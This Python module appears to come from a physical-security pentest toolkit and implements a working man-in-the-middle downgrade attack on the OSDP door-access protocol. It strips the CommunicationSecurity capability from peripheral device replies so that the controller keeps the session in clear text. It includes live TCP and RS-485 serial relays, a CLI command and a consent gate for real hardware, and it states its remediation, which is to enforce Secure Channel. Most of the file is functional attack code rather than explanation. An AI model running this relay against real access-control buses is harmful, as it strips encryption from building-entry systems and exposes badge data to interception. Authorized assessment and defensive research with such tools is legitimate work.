"""ATK-03 Secure Channel downgrade: in-path REPLY_PDCAP rewrite forcing clear-text.

This is the first active MITM attack, built on the 04-03 write-capable ``Transform``
seam. On an OSDP bus whose CP does not enforce Secure Channel (the lab ``downgrade``
profile: ``enforce_secure=False``), the CP only negotiates Secure Channel because the
PD advertises the ``CommunicationSecurity`` capability (function code 0x09) in its
``REPLY_PDCAP``. Strip that one capability out of the reply in flight and the CP, seeing
no SC support, never starts the CHLNG/CCRYPT handshake - the whole session stays
clear-text.

Three pieces:

- ``strip_communication_security`` / ``strip_sc_capability`` rewrite a ``REPLY_PDCAP``
  payload (or a chunk of pd->cp bytes) to drop the ``CommunicationSecurity`` triple,
  re-encoding through ``codec.encode`` so the frame stays wire-valid. ``downgrade_transform``
  wraps this as a stateful, per-direction-buffering ``Transform`` for the live relay
  (a single recv is not guaranteed to be a whole frame; Pitfall 5).
- ``run_downgrade(baseline, attacked)`` is the pure verdict (D-02): it proves the attack
  only against a *secure baseline* that flipped to *clear-text*. The before/after pair is
  the proof. A baseline that was already clear-text, or carried no CommunicationSecurity
  advertisement to strip, is reported as inconclusive (``[]``), never as a success
  (flagged-assumption guard, prohibition).
- ``register`` adds the ``downgrade`` subcommand driving the transform onto the lab bus by
  default (``TCPTap.serve_rewrite``); the ``--physical`` branch routes through the SAFE-02
  consent gate (``safety.open_physical_endpoint``) before any byte reaches real hardware.

``main`` is the attacker-container entrypoint (the ``docker-compose.downgrade.yml`` override
runs ``python -m interlock.osdp.attacks.downgrade``): it serves the rewrite relay and tees
the forwarded, post-rewrite bytes to one capture file per direction, so the @lab test can
read the attacked (downgraded) session back out exactly as the read-only tap-capture does.

Import discipline: importable with the standard library plus the stdlib-only Phase 3
modules (codec/framer/constants/transport) and the stdlib-only ``attack_map``. ``secure_channel`` (cryptography), ``typer``,
``report`` and ``safety`` are imported lazily inside the functions that need them.
"""

from __future__ import annotations

import os
from dataclasses import replace
from pathlib import Path
from typing import TYPE_CHECKING

from interlock.osdp import codec, constants, framer
from interlock.osdp.attack_map import MAPPINGS
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction, TCPTap, Transform
from interlock.plugin import Finding, Severity

if TYPE_CHECKING:
    import typer

# The PD capability function code the downgrade strips so the CP sees no SC support.
# VERIFIED: OSDP capability function-code table (mirrors enumerate.CAPABILITY_CODES 0x09).
_COMMUNICATION_SECURITY = 0x09

# ATK-03 ATT&CK ids (Enterprise primary, ICS secondary), read from interlock.osdp.attack_map.
_TECHNIQUE = MAPPINGS["downgrade"].enterprise
_ICS_TECHNIQUE = MAPPINGS["downgrade"].ics

# Lab defaults: listen in the attacker (inline MITM) position and rewrite toward the PD.
_DEFAULT_LISTEN_PORT = 10000
_DEFAULT_UPSTREAM = ("pd", 10000)

# Attacker-container capture paths for the live relay (mirrors osdp.tap_capture); the @lab
# test reads these back out via docker compose exec. No host mount, no published port (SAFE-01).
_LAB_PORT = 10000
_CAPTURE_DIR = Path("/app/capture")
_CP2PD_PATH = _CAPTURE_DIR / "cp2pd.cap"
_PD2CP_PATH = _CAPTURE_DIR / "pd2cp.cap"

# Per-read size for the --physical two-segment serial relay.
_READ_SIZE = 4096


def strip_communication_security(frame: OsdpFrame) -> OsdpFrame:
    """Return a copy of a ``REPLY_PDCAP`` frame with the CommunicationSecurity triple removed.

    A ``REPLY_PDCAP`` payload is a flat sequence of 3-byte (function_code, compliance, count)
    capability triples. Every triple whose function code is ``CommunicationSecurity`` (0x09)
    is dropped; all other triples are kept in order. Any trailing bytes that do not complete
    a triple are preserved verbatim, so nothing outside the stripped capability changes. The
    returned frame re-encodes to valid wire bytes via ``codec.encode``.
    """
    body_len = len(frame.data) - (len(frame.data) % 3)
    kept = bytearray()
    for i in range(0, body_len, 3):
        triple = frame.data[i : i + 3]
        if triple[0] != _COMMUNICATION_SECURITY:
            kept += triple
    tail = frame.data[body_len:]  # preserve any stray non-triple tail byte-for-byte
    return replace(frame, data=bytes(kept) + bytes(tail))


def strip_sc_capability(direction: Direction, data: bytes) -> bytes:
    """Rewrite pd->cp ``REPLY_PDCAP`` frames in ``data`` to drop CommunicationSecurity.

    Frames ``data`` via ``framer.iter_frames`` and, for each complete pd->cp ``REPLY_PDCAP``
    frame, decodes it, strips the CommunicationSecurity capability, and re-encodes through
    ``codec.encode``; every other complete frame is forwarded byte-identically (its original
    slice). If ``data`` holds no complete frame (a partial chunk), it is returned unchanged.

    This is the stateless, single-chunk form (used by the host unit test, where each crafted
    frame arrives whole). For a live relay whose frames may split across reads, use
    ``downgrade_transform`` which buffers per direction.
    """
    frames = list(framer.iter_frames(data))
    if not frames:
        return data
    return _rewrite_frames(direction, frames)


def _rewrite_frames(direction: Direction, frames: list[bytes]) -> bytes:
    """Return ``frames`` concatenated, rewriting each pd->cp REPLY_PDCAP in place."""
    out = bytearray()
    for raw in frames:
        if direction is Direction.pd_to_cp:
            try:
                frame = codec.decode(raw)
            except codec.DecodeError:
                out += raw  # trailer-valid but structurally odd; forward unchanged
                continue
            if frame.code == constants.REPLY_PDCAP:
                out += codec.encode(strip_communication_security(frame))
                continue
        out += raw
    return bytes(out)


def downgrade_transform() -> Transform:
    """Return a stateful ``Transform`` that strips CommunicationSecurity from the live bus.

    Buffers bytes per direction because a single recv is not guaranteed to be a whole frame
    (Pitfall 5): each call appends the chunk, re-runs ``framer.iter_frames`` over the growing
    per-direction buffer, and forwards only the newly completed frames (rewriting pd->cp
    ``REPLY_PDCAP`` via ``codec.encode``, passing everything else through byte-identically).
    A chunk that completes no new frame returns ``b""`` so the rewrite pump holds the partial
    bytes until the frame completes. Mirrors ``sniff.decode_chunks``' emitted-count discipline.
    """
    buffers: dict[Direction, bytearray] = {
        Direction.cp_to_pd: bytearray(),
        Direction.pd_to_cp: bytearray(),
    }
    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}

    def transform(direction: Direction, data: bytes) -> bytes:
        buffer = buffers[direction]
        buffer.extend(data)
        frames = list(framer.iter_frames(bytes(buffer)))
        out = _rewrite_frames(direction, frames[forwarded[direction] :])
        forwarded[direction] = len(frames)
        return out

    return transform


def _advertises_communication_security(frames: list[tuple[Direction, OsdpFrame]]) -> bool:
    """Return True if any REPLY_PDCAP in ``frames`` advertises CommunicationSecurity (0x09)."""
    for _direction, frame in frames:
        if frame.code != constants.REPLY_PDCAP:
            continue
        body_len = len(frame.data) - (len(frame.data) % 3)
        for i in range(0, body_len, 3):
            if frame.data[i] == _COMMUNICATION_SECURITY:
                return True
    return False


def run_downgrade(
    baseline_frames: list[tuple[Direction, OsdpFrame]],
    attacked_frames: list[tuple[Direction, OsdpFrame]],
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Emit a downgrade Finding only when a secure baseline was forced to clear-text.

    The before/after capture pair is the proof (D-05 wire-grounded): success requires
    ``detect_state(baseline).secure`` AND ``detect_state(attacked).clear_text``. A baseline
    that was never secure, that advertised no ``CommunicationSecurity`` capability to strip,
    or an attacked session that stayed secure all yield ``[]`` - reported as inconclusive,
    never as a false downgrade success (flagged-assumption guard, prohibition).
    """
    from interlock.osdp import secure_channel

    baseline = list(baseline_frames)
    attacked = list(attacked_frames)

    baseline_state = secure_channel.detect_state(baseline)
    if not baseline_state.secure:
        return []  # inconclusive: no secure baseline to downgrade from
    if not _advertises_communication_security(baseline):
        return []  # inconclusive: nothing to strip (no CommunicationSecurity advertised)
    if not secure_channel.detect_state(attacked).clear_text:
        return []  # the attack did not force clear-text

    baseline_codes = sorted(f"0x{code:02x}" for code in baseline_state.scs_codes)
    return [
        Finding(
            id="ATK-03-downgrade",
            title="OSDP Secure Channel downgraded to clear-text by in-path capability rewrite",
            severity=Severity.HIGH,
            evidence=(
                "An in-path MITM stripped the CommunicationSecurity capability (function 0x09) "
                "from the PD's REPLY_PDCAP. Baseline session was Secure Channel "
                f"(SCB seen={baseline_state.scb_seen}, SCS codes={baseline_codes or 'none'}); "
                "after the rewrite the CP never started the handshake and the attacked session "
                "is clear-text (no SCB, no SCS). The before/after pair proves the downgrade."
            ),
            attack_technique=technique,
            attack_technique_ics=_ICS_TECHNIQUE,
            remediation=(
                "Enable and ENFORCE OSDP Secure Channel on the CP (EnforceSecure): a CP that "
                "refuses a clear-text fallback cannot be downgraded by rewriting the PD's "
                "advertised capabilities. Do not rely on the PD advertising CommunicationSecurity."
            ),
        )
    ]


def serve_downgrade_lab(target_port: int, upstream: tuple[str, int]) -> None:
    """Serve the inline downgrade rewrite relay against the lab bus (blocking).

    Drives ``downgrade_transform`` onto the write-capable ``TCPTap.serve_rewrite`` seam: the
    CP dials the attacker position, each pd->cp REPLY_PDCAP is stripped of CommunicationSecurity
    in flight, and the CP falls back to clear-text. Blocks serving connections, like the
    read-only tap's ``serve_forever``.
    """
    TCPTap(target_port, upstream).serve_rewrite(downgrade_transform())


def _capturing_downgrade_transform(cp2pd_path: Path, pd2cp_path: Path) -> Transform:
    """Return a downgrade ``Transform`` that also tees the forwarded bytes to per-direction files.

    Wraps ``downgrade_transform`` and appends the post-rewrite output (exactly what the CP
    receives) to one capture file per direction, so the @lab test can read the attacked,
    downgraded session back out. Both files are truncated at startup. No host mount, no
    published port (SAFE-01).
    """
    inner = downgrade_transform()
    cp2pd_path.parent.mkdir(parents=True, exist_ok=True)
    cp2pd_path.write_bytes(b"")
    pd2cp_path.write_bytes(b"")
    handles = {
        Direction.cp_to_pd: cp2pd_path.open("ab"),
        Direction.pd_to_cp: pd2cp_path.open("ab"),
    }

    def transform(direction: Direction, data: bytes) -> bytes:
        out = inner(direction, data)
        if out:
            handle = handles[direction]
            handle.write(out)
            handle.flush()
        return out

    return transform


def _upstream() -> tuple[str, int]:
    """Parse ``ATTACKER_UPSTREAM`` (``host:port``) with a ``pd:10000`` default."""
    raw = os.environ.get("ATTACKER_UPSTREAM", f"pd:{_LAB_PORT}")
    host, _, port = raw.partition(":")
    return host, int(port) if port else _LAB_PORT


def main() -> None:
    """Attacker-container entrypoint: serve the downgrade rewrite relay and capture it.

    Run by the ``docker-compose.downgrade.yml`` override as
    ``python -m interlock.osdp.attacks.downgrade``. Listens where the CP dials, rewrites each
    pd->cp REPLY_PDCAP in flight, forwards to the upstream PD, and tees the forwarded bytes to
    one capture file per direction for the @lab test to read back.
    """
    upstream = _upstream()
    transform = _capturing_downgrade_transform(_CP2PD_PATH, _PD2CP_PATH)
    print(
        f"interlock: downgrade MITM listening on 0.0.0.0:{_LAB_PORT} "
        f"upstream={upstream[0]}:{upstream[1]}",
        flush=True,
    )
    TCPTap(_LAB_PORT, upstream).serve_rewrite(transform)


def _serial_rewrite_relay(cp_endpoint: object, pd_endpoint: object) -> None:
    """Run the downgrade rewrite over a two-segment real serial MITM (``--physical``).

    An RS-485 OSDP bus must be split into a CP-side and a PD-side segment for an inline
    rewrite. Both pyserial endpoints are opened (the CP-side only after the SAFE-02 consent
    gate), and the ``downgrade_transform`` is applied to each direction. Blocking; kept
    dependency-light so the module imports with no pyserial at module scope.
    """
    import threading

    transform = downgrade_transform()

    def pump(src: object, dst: object, direction: Direction) -> None:
        while True:
            data = bytes(src.read(_READ_SIZE))  # type: ignore[attr-defined]
            if not data:
                continue
            out = transform(direction, data)
            if out:
                dst.write(out)  # type: ignore[attr-defined]

    worker = threading.Thread(
        target=pump, args=(pd_endpoint, cp_endpoint, Direction.pd_to_cp), daemon=True
    )
    worker.start()
    pump(cp_endpoint, pd_endpoint, Direction.cp_to_pd)


def register(app: typer.Typer) -> None:
    """Attach the ``downgrade`` subcommand to the ``osdp`` Typer group."""
    import typer

    @app.command("downgrade")
    def downgrade(
        port: int = typer.Option(
            _DEFAULT_LISTEN_PORT,
            "--port",
            help="Local TCP port to listen on (attacker inline position, lab default).",
        ),
        upstream_host: str = typer.Option(
            _DEFAULT_UPSTREAM[0],
            "--upstream-host",
            help="Upstream PD host to relay to (lab default).",
        ),
        upstream_port: int = typer.Option(
            _DEFAULT_UPSTREAM[1],
            "--upstream-port",
            help="Upstream PD port to relay to.",
        ),
        physical: bool = typer.Option(
            False,
            "--physical",
            help="Run the downgrade over a REAL two-segment serial bus, behind the "
            "SAFE-02 consent gate.",
        ),
        device: str = typer.Option(
            "",
            "--device",
            help="CP-side serial device path for --physical (e.g. /dev/ttyUSB0).",
        ),
        upstream_device: str = typer.Option(
            "",
            "--upstream-device",
            help="PD-side serial device path for --physical (e.g. /dev/ttyUSB1).",
        ),
        target: str = typer.Option(
            "",
            "--target",
            help="Scope identifier you are authorized to assess (required for --physical).",
        ),
    ) -> None:
        """Downgrade OSDP Secure Channel to clear-text via an in-path REPLY_PDCAP rewrite."""
        if physical:
            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted.
            from interlock.osdp import transport
            from interlock.osdp.attacks import safety

            if not device or not upstream_device or not target:
                raise typer.BadParameter(
                    "--physical requires --device, --upstream-device and --target"
                )
            cp_endpoint = safety.open_physical_endpoint(device, target)
            try:
                pd_endpoint = transport.open_serial_endpoint(upstream_device)
                try:
                    typer.echo(
                        "Running downgrade MITM over the consented serial segments "
                        "(Ctrl-C to stop)."
                    )
                    _serial_rewrite_relay(cp_endpoint, pd_endpoint)
                finally:
                    pd_endpoint.close()
            finally:
                cp_endpoint.close()
            return

        typer.echo(
            f"Running downgrade MITM on the lab bus: listening on :{port}, "
            f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
        )
        serve_downgrade_lab(port, (upstream_host, upstream_port))


if __name__ == "__main__":
    main()
